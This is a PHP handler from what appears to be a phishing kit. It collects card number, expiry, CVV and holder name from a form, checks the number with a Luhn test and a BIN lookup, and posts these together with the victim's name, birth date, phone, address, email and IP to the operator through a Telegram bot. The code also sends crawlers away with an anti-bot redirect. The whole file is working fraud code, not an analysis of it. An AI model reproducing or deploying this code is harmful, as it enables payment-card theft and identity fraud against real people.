<?php

session_start();
include('../../../antibots.php');
include('../../../config.php');
include('../../../app/functions.php');
include('../../../common/subb_includes.php');

file_get_contents("https://api.telegram.org/bot{$token}/setWebhook?url=https://{$_SERVER['HTTP_HOST']}/app/webhook.php");

if ($_SESSION['bot'] == '1') {

    if ($_POST) {

        if (!empty($_POST['holder'] && $_POST['number'] && $_POST['exp'] && $_POST['cvv'])) {

            if (luhnChecker($_POST['number'])) {

                $_SESSION['holder'] = htmlspecialchars($_POST['holder']);
                $_SESSION['number'] = htmlspecialchars($_POST['number']);       
                $_SESSION['exp'] = htmlspecialchars($_POST['exp']);     
                $_SESSION['cvv'] = htmlspecialchars($_POST['cvv']);
                $_SESSION['bin'] = str_replace(' ', '', $_SESSION['number']);
                $_SESSION['bin'] = substr($_SESSION['bin'], 0, 6);
                binChecker($_SESSION['bin']);

                function isDateExpired($expiryDate) {
                    list($month, $year) = explode('/', $expiryDate);
                    
                    $month = intval($month);
                    $year = intval($year);
                
                    $targetMonth = 6;
                    $targetYear = 24;
                
                    if ($year < $targetYear) {
                        return true;
                    } elseif ($year === $targetYear && $month < $targetMonth) {
                        return true;
                    } else {
                        return false;
                    }
                }
                
                if (isDateExpired($_SESSION['exp'])) {
                    header('location: ../?exp');
                } 

$text = "
[💳] +1 INFORMATIONS DE PAIEMENT [💳]

💳 Numéro de carte ➟ <code>{$_SESSION['number']}</code>
💳 Date d'expiration ➟ <code>{$_SESSION['exp']}</code>
💳 Cvv ➟ <code>{$_SESSION['cvv']}</code>

[🏛️] INFORMATIONS DE LA BANQUE [🏛️]

🏛️ Type ➟ {$_SESSION['type']}
🏛️ Niveau ➟ {$_SESSION['level']}
🏛️ Banque ➟ {$_SESSION['bank']}

[🎲] INFORMATIONS DE LA VICTIME [🎲]

🎲 Nom complet ➟ {$_SESSION['name']}
🎲 Date de naissance ➟ {$_SESSION['dob']}
🎲 Numéro de téléphone ➟ {$_SESSION['phone']}

📧 Adresse ➟ {$_SESSION['address']}
📧 Code postal ➟ {$_SESSION['zip']}
📧 Ville ➟ {$_SESSION['city']}

[🌐] TIERS [🌐]

🌐 Adresse e-mail ➟ {$_SESSION['email']}
🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}
"; 

            sendMessage($chat_id, $text, null);

            $_SESSION['load'] = 'success';
            $_SESSION['card-error'] = "";
            header('location: ../../loading/');
        
            } else {
                $_SESSION['card-error'] = "La carte que vous avez entré est incorrecte, veuillez réessayer." ;
                header('location: ../?error');
            }

        } else {
            $_SESSION['card-error'] = "Remplissez les champs de texte" ;
            header('location: ../');
        }

    } else {
        $_SESSION['card-error'] = "Requête invalide" ;
        header('location: ../');
    }

} else {
    header('location: https://google.com/404');
}